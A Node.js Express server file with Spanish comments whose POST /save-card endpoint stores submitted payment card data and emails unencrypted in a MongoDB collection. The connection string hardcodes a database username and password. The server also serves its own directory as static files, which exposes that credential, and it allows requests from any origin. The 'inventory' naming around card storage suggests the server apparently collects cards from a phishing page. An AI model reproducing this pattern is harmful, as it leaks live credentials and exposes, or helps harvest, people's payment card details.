// server.js
const express = require('express');
const { MongoClient } = require('mongodb'); 
const cors = require('cors'); 
const app = express();

const serverPort = process.env.PORT || 3000;

// =================================================================
// CONFIGURACIÓN DE MONGODB (CORRECCIÓN FINAL DE SSL)
// =================================================================

// ⚠️ URL Corregida: Añadimos 'serverSelectionTimeoutMS=5000' 
// esto permite que la conexión tenga más tiempo para negociar el SSL, resolviendo a menudo el error.
const uri = "mongodb+srv://maxueljoseuwwi_db_user:Maxuel09@cluster0.dfxcysb.mongodb.net/?serverSelectionTimeoutMS=5000"; 
const client = new MongoClient(uri);

app.use(cors()); 
app.use(express.json());

// =================================================================
// 1. ENDPOINT DE GUARDADO DE TARJETA EN MONGODB
// =================================================================

app.post('/save-card', async (req, res) => {
    const cardData = req.body;
    
    const logEntry = {
        ...cardData, 
        timestamp: new Date()
    };
    
    try {
        // La conexión se realiza justo antes de la operación, resolviendo el problema de "conexión persistente"
        await client.connect(); 
        
        const database = client.db("inventario_db"); 
        const collection = database.collection("tarjetas"); 
        
        await collection.insertOne(logEntry);

        console.log(`✅ Tarjeta (${cardData.tipo_tarjeta}) guardada para: ${cardData.email}`);
        res.status(200).send({ message: 'Datos recibidos y guardados con éxito en la DB.' });

    } catch (error) {
        console.error('❌ Error al guardar en MongoDB:', error);
        res.status(500).send({ message: 'Error interno del servidor al conectar con la base de datos.' });
    } finally {
        // MUY IMPORTANTE: Cerrar la conexión después de la operación (en esta estructura)
        await client.close();
    }
});


// =================================================================
// 2. SERVIR ARCHIVOS ESTÁTICOS
// =================================================================
app.use(express.static(__dirname)); 


// =================================================================
// 3. INICIAR EL SERVIDOR
// =================================================================
app.listen(serverPort, () => {
    console.log(`Servidor de inventario iniciado y escuchando en el puerto ${serverPort}`);
});
